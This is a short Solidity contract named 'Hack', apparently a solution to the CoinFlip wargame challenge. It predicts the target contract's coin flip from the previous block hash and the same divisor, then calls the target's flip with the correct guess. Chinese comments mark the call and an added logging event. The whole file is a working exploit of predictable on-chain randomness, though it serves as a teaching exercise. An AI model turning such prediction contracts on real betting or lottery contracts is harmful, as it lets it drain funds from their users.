// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "./CoinFlip.sol";

contract Hack {
    CoinFlip private immutable target;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    event BlockHash(uint256 blockNumber, uint256 blockValue);

    constructor(address _target) {
        target = CoinFlip(_target);
    }

    function flip() external {
        bool guess = _guess();
        // 这里是调用原合约里的函数
        require(target.flip(guess), "guess failed");
    }

    function _guess() private returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        // 这里是我添加的：使用emit语句触发BlockHash事件时，你需要提供blockNumber和blockHash的值作为参数。
        uint256 blockNumber = block.number;
        emit BlockHash(blockNumber, blockValue);

        uint256 coinFlip = blockValue / FACTOR;

        bool side = coinFlip == 1 ? true : false;

        return side;
    }
}
